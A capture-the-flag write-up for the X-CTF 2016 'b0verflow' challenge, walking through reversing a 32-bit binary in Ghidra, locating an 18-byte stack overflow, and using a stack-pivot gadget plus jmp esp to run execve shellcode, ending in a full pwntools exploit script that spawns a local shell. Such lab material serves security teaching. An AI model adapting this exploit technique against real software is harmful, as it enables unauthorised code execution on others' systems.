# xctf16_b0verflow

Let's take a look at the binary:

```
$    file b0verflow
b0verflow: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=9f2d9dc0c9cc531c9656e6e84359398dd765b684, not stripped
$     pwn checksec b0verflow
[*] '/Hackery/pod/modules/stack_pivot/xctf16_b0verflow/b0verflow'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
$    ./b0verflow

======================

Welcome to X-CTF 2016!

======================
What's your name?
guyinatuxedo
Hello guyinatuxedo
```

So we can see that we are dealing with a `32` bit dynamically linked binary, with none of the standard mitigations (and has memory segments with `rwx` permissions). When we run it, it prompts us for input, and prints it back to us.

## Reversing

When we take a look at the main function in Ghidra, we see this:

```
void main(void)

{
  vul();
  return;
}
```

So we can see that it essentially just calls the `vul` function, which does this:

```
undefined4 vul(void)

{
  char vulnBuf [32];
 
  puts("\n======================");
  puts("\nWelcome to X-CTF 2016!");
  puts("\n======================");
  puts("What\'s your name?");
  fflush(stdout);
  fgets(vulnBuf,0x32,stdin);
  printf("Hello %s.",vulnBuf);
  fflush(stdout);
  return 1;
}
```

So we can see that it prints out some text. Then it scans `0x32` (`50`) bytes worth of data into a `32` byte buffer, giving us an `18` byte buffer overflow. Proceeding that the function returns.

## Stack Pivot Exploit

So we can overwrite the return address (seeing where the start of our input is in comparison to the saved return address is, we can see that the offset is `0x24` bytes since `0xffffd11c - 0xffffd0f8 = 0x24`):

```
gef➤  b *0x804857a
Breakpoint 1 at 0x804857a
gef➤  r
Starting program: /Hackery/pod/modules/stack_pivot/xctf16_b0verflow/b0verflow

======================

Welcome to X-CTF 2016!

======================
What's your name?
15935728

Breakpoint 1, 0x0804857a in vul ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffd0f8  →  "15935728"
$ebx   : 0x0       
$ecx   : 0xf7fb601c  →  0x00000000
$edx   : 0xffffd0f8  →  "15935728"
$esp   : 0xffffd0e0  →  0xffffd0f8  →  "15935728"
$ebp   : 0xffffd118  →  0xffffd128  →  0x00000000
$esi   : 0xf7fb4000  →  0x001dbd6c
$edi   : 0xf7fb4000  →  0x001dbd6c
$eip   : 0x0804857a  →  <vul+95> lea eax, [ebp-0x20]
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────── stack ────
0xffffd0e0│+0x0000: 0xffffd0f8  →  "15935728"     ← $esp
0xffffd0e4│+0x0004: 0x00000032 ("2"?)
0xffffd0e8│+0x0008: 0xf7fb45c0  →  0xfbad2288
0xffffd0ec│+0x000c: 0x08048369  →  <_init+9> add ebx, 0x1c97
0xffffd0f0│+0x0010: 0xf7fb43fc  →  0xf7fb5980  →  0x00000000
0xffffd0f4│+0x0014: 0x00040000
0xffffd0f8│+0x0018: "15935728"
0xffffd0fc│+0x001c: "5728"
─────────────────────────────────────────────────────────────── code:x86:32 ────
    0x804856f <vul+84>         lea    eax, [ebp-0x20]
    0x8048572 <vul+87>         mov    DWORD PTR [esp], eax
    0x8048575 <vul+90>         call   0x80483c0 <fgets@plt>
 →  0x804857a <vul+95>         lea    eax, [ebp-0x20]
    0x804857d <vul+98>         mov    DWORD PTR [esp+0x4], eax
    0x8048581 <vul+102>        mov    DWORD PTR [esp], 0x8048682
    0x8048588 <vul+109>        call   0x80483a0 <printf@plt>
    0x804858d <vul+114>        mov    eax, ds:0x804a060
    0x8048592 <vul+119>        mov    DWORD PTR [esp], eax
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "b0verflow", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804857a → vul()
[#1] 0x8048519 → main()
────────────────────────────────────────────────────────────────────────────────
gef➤  search-pattern 15935728
[+] Searching '15935728' in memory
[+] In '[heap]'(0x804b000-0x806d000), permission=rwx
  0x804b570 - 0x804b578  →   "15935728"
[+] In '[stack]'(0xfffdd000-0xffffe000), permission=rwx
  0xffffd0f8 - 0xffffd100  →   "15935728"
gef➤  i f
Stack level 0, frame at 0xffffd120:
 eip = 0x804857a in vul; saved eip = 0x8048519
 called by frame at 0xffffd130
 Arglist at 0xffffd118, args:
 Locals at 0xffffd118, Previous frame's sp is 0xffffd120
 Saved registers:
  ebp at 0xffffd118, eip at 0xffffd11c
```

So the question is, what will we call. PIE isn't enabled, so we can call gadgets from the binary. At the moment we don't have a stack or libc infoleak. The gadgets from the binary won't be enough to pop a shell on it's own, however it will be enough to call shellcode on the stack without a stack infoleak:

Stack pivot gadget:
```
$    python ROPgadget.py --binary b0verflow | grep "sub esp"
0x080484fd : push ebp ; mov ebp, esp ; sub esp, 0x24 ; ret
```

Jmp esp gadget:
```
$    python ROPgadget.py --binary b0verflow | grep "jmp esp"
0x08048504 : jmp esp
```

So we will call the Stack pivot gadget first, then the `jmp esp` gadget. The stack pivot gadget will move the stack pointer down to our own input. It will leave off by executing the first DWORD of our input as an instruction pointer. That instruction pointer will be the `jmp esp` gadget. When that instruction is executed, the `esp` pointer will point to the new DWORD, which will be the second `4` bytes of our input. We will store our shellcode there, which will be executed by the `jmp esp` gadget. Let's take a look at how these gadgets operate:

We start off with the stack pivot gadget:
```
0x080484fd in hint ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$eax   : 0x1       
$ebx   : 0x0       
$ecx   : 0xf7f2b010  →  0x00000000
$edx   : 0x0       
$esp   : 0xffa29750  →  0x08048504  →  <hint+7> jmp esp
$ebp   : 0x31313131 ("1111"?)
$esi   : 0xf7f29000  →  0x001dbd6c
$edi   : 0xf7f29000  →  0x001dbd6c
$eip   : 0x080484fd  →  <hint+0> push ebp
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────── stack ────
0xffa29750│+0x0000: 0x08048504  →  <hint+7> jmp esp     ← $esp
0xffa29754│+0x0004: 0xf7f2000a  →  0x02b00e46
0xffa29758│+0x0008: 0x00000000
0xffa2975c│+0x000c: 0xf7d6b751  →  <__libc_start_main+241> add esp, 0x10
0xffa29760│+0x0010: 0x00000001
0xffa29764│+0x0014: 0xffa297f4  →  0xffa2a3e2  →  "./b0verflow"
0xffa29768│+0x0018: 0xffa297fc  →  0xffa2a3ee  →  "GNOME_TERMINAL_SCREEN=/org/gnome/Terminal/screen/7[...]"
0xffa2976c│+0x001c: 0xffa29784  →  0x00000000
─────────────────────────────────────────────────────────────── code:x86:32 ────
    0x80484f2 <frame_dummy+34> jmp    0x8048470 <register_tm_clones>
    0x80484f7 <frame_dummy+39> nop    
    0x80484f8 <frame_dummy+40> jmp    0x8048470 <register_tm_clones>
 →  0x80484fd <hint+0>         push   ebp
    0x80484fe <hint+1>         mov    ebp, esp
    0x8048500 <hint+3>         sub    esp, 0x24
    0x8048503 <hint+6>         ret    
    0x8048504 <hint+7>         jmp    esp
    0x8048506 <hint+9>         ret    
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "b0verflow", stopped, reason: SINGLE STEP
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x80484fd → hint()
[#1] 0x8048504 → hint()
────────────────────────────────────────────────────────────────────────────────
gef➤  p $esp
$1 = (void *) 0xffa29750
```

We can see that the `esp` register is equal to `0xffa29750`. We can see that it decrements the value of the `esp` register by `0x28` (`0x24` from the sub, `0x4` from the pop):

```
0x08048503 in hint ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$eax   : 0x1       
$ebx   : 0x0       
$ecx   : 0xf7f2b010  →  0x00000000
$edx   : 0x0       
$esp   : 0xffa29728  →  0x08048504  →  <hint+7> jmp esp
$ebp   : 0xffa2974c  →  0x31313131 ("1111"?)
$esi   : 0xf7f29000  →  0x001dbd6c
$edi   : 0xf7f29000  →  0x001dbd6c
$eip   : 0x08048503  →  <hint+6> ret
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────── stack ────
0xffa29728│+0x0000: 0x08048504  →  <hint+7> jmp esp     ← $esp
0xffa2972c│+0x0004: 0x6850c031
0xffa29730│+0x0008: 0x68732f2f
0xffa29734│+0x000c: 0x69622f68
0xffa29738│+0x0010: 0x50e3896e
0xffa2973c│+0x0014: 0xb0e18953
0xffa29740│+0x0018: 0x3180cd0b
0xffa29744│+0x001c: 0x31313131
─────────────────────────────────────────────────────────────── code:x86:32 ────
    0x80484fd <hint+0>         push   ebp
    0x80484fe <hint+1>         mov    ebp, esp
    0x8048500 <hint+3>         sub    esp, 0x24
 →  0x8048503 <hint+6>         ret    
   ↳   0x8048504 <hint+7>         jmp    esp
       0x8048506 <hint+9>         ret    
       0x8048507 <hint+10>        mov    eax, 0x1
       0x804850c <hint+15>        pop    ebp
       0x804850d <hint+16>        ret    
       0x804850e <main+0>         push   ebp
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "b0verflow", stopped, reason: SINGLE STEP
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048503 → hint()
[#1] 0x8048504 → hint()
[#2] 0x8048504 → hint()
────────────────────────────────────────────────────────────────────────────────
gef➤  p $esp
$2 = (void *) 0xffa29728
gef➤  x/w 0xffa29728
0xffa29728:    0x8048504
gef➤  x/2i 0x8048504
=> 0x8048504 <hint+7>:    jmp    esp
   0x8048506 <hint+9>:    ret
```

We can see that `esp` points to our `jump esp` gadget at the start of our input.  

```
0x08048504 in hint ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$eax   : 0x1       
$ebx   : 0x0       
$ecx   : 0xf7f2b010  →  0x00000000
$edx   : 0x0       
$esp   : 0xffa2972c  →  0x6850c031
$ebp   : 0xffa2974c  →  0x31313131 ("1111"?)
$esi   : 0xf7f29000  →  0x001dbd6c
$edi   : 0xf7f29000  →  0x001dbd6c
$eip   : 0x08048504  →  <hint+7> jmp esp
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────── stack ────
0xffa2972c│+0x0000: 0x6850c031     ← $esp
0xffa29730│+0x0004: 0x68732f2f
0xffa29734│+0x0008: 0x69622f68
0xffa29738│+0x000c: 0x50e3896e
0xffa2973c│+0x0010: 0xb0e18953
0xffa29740│+0x0014: 0x3180cd0b
0xffa29744│+0x0018: 0x31313131
0xffa29748│+0x001c: 0x31313131
─────────────────────────────────────────────────────────────── code:x86:32 ────
    0x80484fe <hint+1>         mov    ebp, esp
    0x8048500 <hint+3>         sub    esp, 0x24
    0x8048503 <hint+6>         ret    
 →  0x8048504 <hint+7>         jmp    esp
    0x8048506 <hint+9>         ret    
    0x8048507 <hint+10>        mov    eax, 0x1
    0x804850c <hint+15>        pop    ebp
    0x804850d <hint+16>        ret    
    0x804850e <main+0>         push   ebp
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "b0verflow", stopped, reason: SINGLE STEP
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048504 → hint()
[#1] 0x8048504 → hint()
────────────────────────────────────────────────────────────────────────────────
gef➤  p $esp
$4 = (void *) 0xffa2972c
gef➤  x/10i 0xffa2972c
   0xffa2972c:    xor    eax,eax
   0xffa2972e:    push   eax
   0xffa2972f:    push   0x68732f2f
   0xffa29734:    push   0x6e69622f
   0xffa29739:    mov    ebx,esp
   0xffa2973b:    push   eax
   0xffa2973c:    push   ebx
   0xffa2973d:    mov    ecx,esp
   0xffa2973f:    mov    al,0xb
   0xffa29741:    int    0x80
```

We can see that when the `jmp esp` gadget is ran, `esp` points to our shellcode (which is stored right after the `jmp esp` gadget). With that, our shellcode is executed and we get a shell. Also I did not write the shellcode myself, I got it from `http://shell-storm.org/shellcode/files/shellcode-827.php`.

## Exploit

Putting it all together, we have the following exploit:

```
from pwn import *

# Establish the target process
target = process('./b0verflow')
#gdb.attach(target, gdbscript = 'b *0x080485a0')

# The shellcode we will use
# I did not write this, it is from: http://shell-storm.org/shellcode/files/shellcode-827.php
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Establish our rop gadgets

# 0x08048504 : jmp esp
jmpEsp = p32(0x08048504)

# 0x080484fd : push ebp ; mov ebp, esp ; sub esp, 0x24 ; ret
pivot = p32(0x80484fd)

# Make the payload

payload = ""
payload += jmpEsp # Our jmp esp gadget
payload += shellcode # Our shellcode
payload += "1"*(0x20 - len(shellcode)) # Filler between end of shellcode and saved return address
payload += pivot # Our pivot gadget

# Send our payload
target.sendline(payload)

# Drop to an interactive shell
target.interactive()
```

When we run the exploit:

```
$    python exploit.py
[+] Starting local process './b0verflow': pid 18753
[*] Switching to interactive mode

======================

Welcome to X-CTF 2016!

======================
What's your name?
Hello \x04\x85\x01�Ph//shh/bin\x89�PS\x89�
                                          111111111��
.$                                                  w
 01:25:14 up 11:10,  1 user,  load average: 1.04, 1.27, 1.35
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu :0       :0               14:15   ?xdm?  42:41   0.01s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --session=ubuntu
$ ls
ROPgadget.py  b0verflow  core  exploit.py  readme.md
```

Just like that, we popped a shell!